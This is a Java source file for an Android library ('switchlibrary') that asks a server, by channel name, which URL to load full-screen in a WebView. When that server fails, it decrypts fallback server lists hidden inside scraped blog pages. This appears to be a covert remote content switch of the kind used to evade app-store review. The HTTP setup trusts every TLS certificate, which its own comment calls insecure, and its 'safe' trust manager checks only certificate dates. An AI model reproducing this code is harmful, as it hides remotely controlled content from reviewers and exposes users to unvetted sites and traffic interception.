package com.pro.switchlibrary;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import com.google.gson.Gson;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.cache.CacheEntity;
import com.lzy.okgo.cache.CacheMode;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.cookie.CookieJarImpl;
import com.lzy.okgo.cookie.store.SPCookieStore;
import com.lzy.okgo.https.HttpsUtils;
import com.lzy.okgo.interceptor.HttpLoggingInterceptor;
import com.lzy.okgo.model.HttpHeaders;
import com.lzy.okgo.model.HttpParams;
import com.lzy.okgo.request.base.Request;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.net.ssl.X509TrustManager;

import okhttp3.OkHttpClient;

public class SwitchMainEnter extends Application {
    private static SwitchMainEnter instance;

    private List<String> urlList1;

    public static SwitchMainEnter getInstance() {


        if (instance == null) {
            instance = new SwitchMainEnter();
        }
        return instance;
    }




    public void getCheckVersion(String url, final String QUDAO, final String KEY, final Activity activity, final String WEB_URL, final String RGEX, final String CHECKVERSION_URL1, final String CHECKVERSION_URL2, final String HEX_KEY) {
        OkGo.<String>post(url + "/checkVersion")
                .tag("url1")
                .params("name", QUDAO)
                .execute(new StringCallback() {
                    @Override
                    public void onStart(Request<String, ? extends Request> request) {
                        super.onStart(request);
                    }

                    @Override
                    public void onSuccess(com.lzy.okgo.model.Response<String> response) {
                        Log.d("print", "onSuccess:106 " + response.body());


                        if (!TextUtils.isEmpty(response.body())) {
                            try {
                                String decrypt = AES.Decrypt(response.body().getBytes(), KEY);
                                Log.d("print", "onSuccess:解密后数据1: " + decrypt);
                                JsonEntity jsonEntity = new Gson().fromJson(decrypt, JsonEntity.class);
                                Log.d("print", "onSuccess:131 1: " + jsonEntity);
                                OkGo.getInstance().cancelAll();

                                if (jsonEntity.getStatus().equals("true") || jsonEntity.getStatus().equals("1")) {
                                    OWebActivity.openUrlNotitle(activity, jsonEntity.getUrl(), null);
                                    activity.finish();
                                    // OkGo.getInstance().cancelAll();

                                } else {
                                    OWebActivity.openUrlNotitle(activity, WEB_URL, null);
                                    activity.finish();
                                    // OkGo.getInstance().cancelAll();

                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                        }
                    }

                    @Override
                    public void onError(com.lzy.okgo.model.Response<String> response) {
                        super.onError(response);
                        //SplashActivity.this.finish();
                        Toast.makeText(activity, "当前网络不好,已退出", Toast.LENGTH_SHORT).show();
                        getBlog(CHECKVERSION_URL1,RGEX,activity,HEX_KEY,QUDAO,KEY,WEB_URL,CHECKVERSION_URL1,CHECKVERSION_URL2);
                        getBlog2(CHECKVERSION_URL2,RGEX,activity,HEX_KEY,QUDAO,KEY,WEB_URL,CHECKVERSION_URL1,CHECKVERSION_URL2);

                    }
                });

    }

    private void getBlog(String blogUrl, final String RGEX, final Activity activity, final String HEX_KEY, final String QUDAO, final String KEY, final String WEB_URL,final String CHECKVERSION_URL1, final String CHECKVERSION_URL2) {
        OkGo.<String>get(blogUrl)
                .tag(this)
                .cacheKey("version")
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(com.lzy.okgo.model.Response<String> response) {

                        if (!TextUtils.isEmpty(response.body())) {

                            Document document = Jsoup.parse(response.body());
                            String subUtilSimple = getSubUtilSimple(document.toString(), RGEX);

                            String s1 = null;
                            try {
                                s1 = AES.HexDecrypt(subUtilSimple.getBytes(), HEX_KEY);
                                urlList1 = getUrlList(s1);

                                if (urlList1.size() > 0) {
                                    for (int i = 0; i < urlList1.size(); i++) {
                                        getCheckVersion2(urlList1.get(i),QUDAO,KEY,activity,WEB_URL,RGEX,CHECKVERSION_URL1,CHECKVERSION_URL2,HEX_KEY);
                                    }
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }


                        }


                    }

                    @Override
                    public void onError(com.lzy.okgo.model.Response<String> response) {
                        super.onError(response);
                        Toast.makeText(activity, "当前网络不好,已退出", Toast.LENGTH_SHORT).show();

                        activity.finish();

                    }
                });
    }

    private void getBlog2(String blogUrl, final String RGEX, final Activity activity, final String HEX_KEY, final String QUDAO, final String KEY, final String WEB_URL,final String CHECKVERSION_URL1, final String CHECKVERSION_URL2) {
        OkGo.<String>get(blogUrl)
                .tag(this)
                .cacheKey("version")
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(com.lzy.okgo.model.Response<String> response) {

                        if (!TextUtils.isEmpty(response.body())) {

                            Document document = Jsoup.parse(response.body());
                            String subUtilSimple = getSubUtilSimple(document.toString(), RGEX);

                            String s1 = null;
                            try {
                                s1 = AES.HexDecrypt(subUtilSimple.getBytes(), HEX_KEY);
                                urlList1 = getUrlList(s1);

                                if (urlList1.size() > 0) {
                                    Log.d("print", "onSuccess:169: " + urlList1);
                                    for (int i = 0; i < urlList1.size(); i++) {
                                        getCheckVersion2(urlList1.get(i),QUDAO,KEY,activity,WEB_URL,RGEX,CHECKVERSION_URL1,CHECKVERSION_URL2,HEX_KEY);

                                    }


                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }


                        }


                    }

                    @Override
                    public void onError(com.lzy.okgo.model.Response<String> response) {
                        super.onError(response);

                        Toast.makeText(activity, "当前网络不好,已退出", Toast.LENGTH_SHORT).show();

                       activity.finish();

                    }
                });
    }

    private void getCheckVersion2(String url, final String QUDAO, final String KEY, final Activity activity, final String WEB_URL, final String RGEX, final String CHECKVERSION_URL1, final String CHECKVERSION_URL2, final String HEX_KEY) {
        OkGo.<String>post(url + "/checkVersion")
                .tag("url1")
                .params("name", QUDAO)
                .execute(new StringCallback() {


                    @Override
                    public void onSuccess(com.lzy.okgo.model.Response<String> response) {

                        if (!TextUtils.isEmpty(response.body())) {
                            Log.d("print", "onSuccess:256 " + response.body());
                            try {
                                String decrypt = AES.Decrypt(response.body().getBytes(), KEY);
                                Log.d("print", "onSuccess:解密后数据2: " + decrypt);
                                JsonEntity jsonEntity = new Gson().fromJson(decrypt, JsonEntity.class);
                                Log.d("print", "onSuccess:131 2: " + jsonEntity);
                                OkGo.getInstance().cancelAll();

                                if (jsonEntity.getStatus().equals("true") || jsonEntity.getStatus().equals("1")) {
                                    com.pro.switchlibrary.OWebActivity.openUrlNotitle(activity, jsonEntity.getUrl(), null);

                                    activity.finish();
                                    // OkGo.getInstance().cancelAll();

                                } else {
                                    OWebActivity.openUrlNotitle(activity, WEB_URL, null);

                                    activity.finish();
                                    // OkGo.getInstance().cancelAll();

                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                        }
                    }

                    @Override
                    public void onError(com.lzy.okgo.model.Response<String> response) {
                        super.onError(response);
                        Toast.makeText(activity, "当前网络不好,已退出", Toast.LENGTH_SHORT).show();
                        activity.finish();


                    }
                });

    }

    public static String getSubUtilSimple(String soap, String rgex) {
        Pattern pattern = Pattern.compile(rgex);// 匹配的模式
        Matcher m = pattern.matcher(soap);
        while (m.find()) {
            return m.group(1);
        }
        return "";
    }

    public static List<String> getUrlList(String urls) {
        List<String> list = new ArrayList<>();
        String[] split = urls.split(";");
        for (int i = 0; i < split.length; i++) {
            list.add(split[i]);
        }

        return list;
    }

    public void initOkGo() {

        //---------这里给出的是示例代码,告诉你可以这么传,实际使用的时候,根据需要传,不需要就不传-------------//
        HttpHeaders headers = new HttpHeaders();
        // headers.put("Content-Type", "application/json;charset=UTF-8");    //header不支持中文，不允许有特殊字符
        headers.put("Content-Type", "text/plain;charset=UTF-8");    //header不支持中文，不允许有特殊字符
        // headers.put("commonHeaderKey2", "commonHeaderValue2");

        HttpParams params = new HttpParams();
        params.put("commonParamsKey1", "commonParamsValue1");     //param支持中文,直接传,不要自己编码
        params.put("commonParamsKey2", "这里支持中文参数");
        //----------------------------------------------------------------------------------------//

        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        //log相关
        HttpLoggingInterceptor loggingInterceptor = new HttpLoggingInterceptor("OkGo");
        loggingInterceptor.setPrintLevel(HttpLoggingInterceptor.Level.BODY);        //log打印级别，决定了log显示的详细程度
        loggingInterceptor.setColorLevel(Level.INFO);                               //log颜色级别，决定了log在控制台显示的颜色
        builder.addInterceptor(loggingInterceptor);                                 //添加OkGo默认debug日志
        //第三方的开源库，使用通知显示当前请求的log，不过在做文件下载的时候，这个库好像有问题，对文件判断不准确
        //builder.addInterceptor(new ChuckInterceptor(this));

        //超时时间设置，默认60秒
        builder.readTimeout(OkGo.DEFAULT_MILLISECONDS, TimeUnit.MILLISECONDS);      //全局的读取超时时间
        builder.writeTimeout(OkGo.DEFAULT_MILLISECONDS, TimeUnit.MILLISECONDS);     //全局的写入超时时间
        builder.connectTimeout(OkGo.DEFAULT_MILLISECONDS, TimeUnit.MILLISECONDS);   //全局的连接超时时间

        //自动管理cookie（或者叫session的保持），以下几种任选其一就行
        builder.cookieJar(new CookieJarImpl(new SPCookieStore(this)));            //使用sp保持cookie，如果cookie不过期，则一直有效
        //builder.cookieJar(new CookieJarImpl(new DBCookieStore(this)));              //使用数据库保持cookie，如果cookie不过期，则一直有效
        // builder.cookieJar(new CookieJarImpl(new MemoryCookieStore()));            //使用内存保持cookie，app退出后，cookie消失

      /*  sCookiejarimpl=new CookieJarImpl(new MemoryCookieStore());
        builder.cookieJar(sCookiejarimpl);*/

        //builder.cookieJar(new com.ltqh.qh.operation.store.CookieJarImpl(new com.ltqh.qh.operation.store.MemoryCookieStore()));

        //https相关设置，以下几种方案根据需要自己设置
        //方法一：信任所有证书,不安全有风险
        HttpsUtils.SSLParams sslParams1 = HttpsUtils.getSslSocketFactory();
        //方法二：自定义信任规则，校验服务端证书
        HttpsUtils.SSLParams sslParams2 = HttpsUtils.getSslSocketFactory(new SafeTrustManager());
        //方法三：使用预埋证书，校验服务端证书（自签名证书）
        //HttpsUtils.SSLParams sslParams3 = HttpsUtils.getSslSocketFactory(getAssets().open("srca.cer"));
        //方法四：使用bks证书和密码管理客户端证书（双向认证），使用预埋证书，校验服务端证书（自签名证书）
        //HttpsUtils.SSLParams sslParams4 = HttpsUtils.getSslSocketFactory(getAssets().open("xxx.bks"), "123456", getAssets().open("yyy.cer"));
        builder.sslSocketFactory(sslParams1.sSLSocketFactory, sslParams1.trustManager);
        //配置https的域名匹配规则，详细看demo的初始化介绍，不需要就不要加入，使用不当会导致https握手失败
        //builder.hostnameVerifier(new SafeHostnameVerifier());

        // 其他统一的配置
        // 详细说明看GitHub文档：https://github.com/jeasonlzy/
        OkGo.getInstance().init(this)                           //必须调用初始化
                .setOkHttpClient(builder.build())               //建议设置OkHttpClient，不设置会使用默认的
                .setCacheMode(CacheMode.NO_CACHE)               //全局统一缓存模式，默认不使用缓存，可以不传
                .setCacheTime(CacheEntity.CACHE_NEVER_EXPIRE)   //全局统一缓存时间，默认永不过期，可以不传
                .setRetryCount(3);                      //全局统一超时重连次数，默认为三次，那么最差的情况会请求4次(一次原始请求，三次重连请求)，不需要可以设置为0
        // .addCommonHeaders(headers);                //全局公共头
//                .addCommonParams(params);                       //全局公共参数

    }

    private class SafeTrustManager implements X509TrustManager {
        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }

        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
            try {
                for (X509Certificate certificate : chain) {
                    certificate.checkValidity(); //检查证书是否过期，签名是否通过等
                }
            } catch (Exception e) {
                throw new CertificateException(e);
            }
        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }
    }
}
